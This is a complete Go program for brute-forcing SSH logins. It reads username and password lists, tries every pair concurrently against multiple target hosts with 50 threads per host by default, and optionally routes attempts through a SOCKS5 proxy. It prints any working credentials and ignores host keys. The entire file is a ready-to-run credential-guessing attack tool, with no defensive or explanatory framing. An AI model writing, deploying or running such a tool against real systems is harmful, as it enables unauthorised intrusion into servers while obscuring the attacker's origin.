package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
	"os"
	"strings"
	"sync"
)

// readLines reads usernames or passwords from a given file.
func readLines(filename string) ([]string, error) {
	var lines []string
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// ensurePort appends default SSH port if not specified.
func ensurePort(addresses []string) []string {
	var result []string
	for _, addr := range addresses {
		if !strings.Contains(addr, ":") {
			addr += ":22"
		}
		result = append(result, addr)
	}
	return result
}

// burstIP attempts SSH connections using provided credentials and proxy.
func burstIP(address string, users, passwords []string, dialer proxy.Dialer, threadCount, detail int) {
    addrCtx, addrCancel := context.WithCancel(context.Background())
    defer addrCancel() // 确保在函数结束时调用addrCancel，避免资源泄漏
    var wg sync.WaitGroup
    semaphore := make(chan struct{}, threadCount)
    for _, user := range users {
        for _, pass := range passwords {
            select {
            case <-addrCtx.Done():
                return
            case semaphore <- struct{}{}:
            }
            wg.Add(1)
            go func(user, pass string) {
                defer wg.Done()
                if trySSH(user, pass, address, dialer, detail) {
                    addrCancel() // 成功的情况下提前退出
                }
                <-semaphore
            }(user, pass)
        }
    }
    wg.Wait()
}


// trySSH tries an SSH connection with the given credentials and proxy.
func trySSH(user, pass, address string, dialer proxy.Dialer, detail int) bool {
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Production environments should use a secure method.
	}

	conn, err := dialer.Dial("tcp", address)
	if err != nil {
		if detail == 1 {
			fmt.Printf("Failed to dial: %s@%s with password %s\n", user, address, pass)
		}
		return false
	}

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, address, config)
	if err != nil {
		if detail == 1 {
			fmt.Printf("Failed to create SSH client: %s@%s with password %s\n", user, address, pass)
		}
		return false
	}
	client := ssh.NewClient(sshConn, chans, reqs)
	defer client.Close()

	fmt.Printf("Success: %s@%s with password %s\n", user, address, pass)
	return true
}

func main() {
	var (
		usernameFile, passwordFile   string
		usernameInput, passwordInput string
		addresses, proxyAddress      string
		threadCount, detail          int
	)

	flag.StringVar(&usernameFile, "u", "", "File containing usernames")
	flag.StringVar(&passwordFile, "p", "", "File containing passwords")
	flag.StringVar(&usernameInput, "U", "", "Directly specified usernames")
	flag.StringVar(&passwordInput, "P", "", "Directly specified passwords")
	flag.StringVar(&addresses, "h", "", "Target addresses")
	flag.StringVar(&proxyAddress, "proxy", "", "SOCKS5 proxy address")
	flag.IntVar(&threadCount, "t", 50, "Threads per address")
	flag.IntVar(&detail, "d", 0, "Detail level (0/1)")
	flag.Parse()

	var users, passwords []string
	var err error

	// Append directly specified usernames/passwords if provided
	if usernameInput != "" {
		users = strings.Split(usernameInput, ",")
	}
	if passwordInput != "" {
		passwords = strings.Split(passwordInput, ",")
	}

	// Read usernames/passwords from file if filename is provided
	if usernameFile != "" {
		fileUsers, err := readLines(usernameFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error reading username file: %v\n", err)
			os.Exit(1)
		}
		users = append(users, fileUsers...)
	}
	if passwordFile != "" {
		filePasswords, err := readLines(passwordFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error reading password file: %v\n", err)
			os.Exit(1)
		}
		passwords = append(passwords, filePasswords...)
	}

	if len(users) == 0 || len(passwords) == 0 {
		fmt.Println("Error: Specify both usernames and passwords via files or directly.")
		os.Exit(1)
	}

	addressList := ensurePort(strings.Split(addresses, ","))

	// Setup proxy dialer if proxy address is provided
	var dialer proxy.Dialer = proxy.Direct
	if proxyAddress != "" {
		dialer, err = proxy.SOCKS5("tcp", proxyAddress, nil, proxy.Direct)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Proxy connection error: %v\n", err)
			os.Exit(1)
		}
	}

	// Launch SSH burst attempts
	var wg sync.WaitGroup
	for _, address := range addressList {
		wg.Add(1)
		go func(address string) {
			defer wg.Done()
			burstIP(address, users, passwords, dialer, threadCount, detail)
		}(address)
	}
	wg.Wait()
}
